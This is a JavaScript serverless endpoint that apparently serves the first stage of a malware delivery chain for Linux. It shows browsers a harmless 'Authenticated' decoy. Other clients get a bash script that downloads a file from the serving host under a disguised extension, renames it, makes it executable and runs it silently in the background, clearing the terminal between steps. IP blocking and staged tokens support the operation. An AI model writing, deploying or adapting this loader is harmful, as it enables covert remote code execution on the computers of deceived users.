// api/task/linux.js
// STEP 1 — Linux
// Issues a step-1 JWT and returns a bootstrap shell script that fetches /tokenlinux with both tokens.

export const config = { runtime: 'edge' };

import {
  getIp, isBrowser, isIpBlocked,
  createStepToken, genSessionId,
  getHost, urlParams, CORS, plainHeaders,
} from './_lib.js';

export default async function handler(req) {
  if (req.method === 'OPTIONS') {
    return new Response(null, { status: 200, headers: CORS });
  }

  const ip        = getIp(req);
  const params    = urlParams(req);
  const origToken = params.get('token') || '';

  if (await isIpBlocked(ip)) {
    console.log('[linux] BLOCKED:', ip);
    return new Response('Access permanently suspended.', { status: 403, headers: CORS });
  }

  const sessionId = genSessionId();
  const st1       = await createStepToken(ip, sessionId, 1, origToken);

  if (isBrowser(req)) {
    return new Response('@echo off\necho Authenticated', {
      status: 200, headers: plainHeaders(),
    });
  }

  const domain = getHost(req);
  const script = `#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/Documents"
mkdir -p "$TARGET_DIR"
clear
wget -q -O "$TARGET_DIR/tokenlinux.npl" "${domain}/api/task/tokenlinux?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
clear
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0
`;

  return new Response(script, { status: 200, headers: plainHeaders() });
}
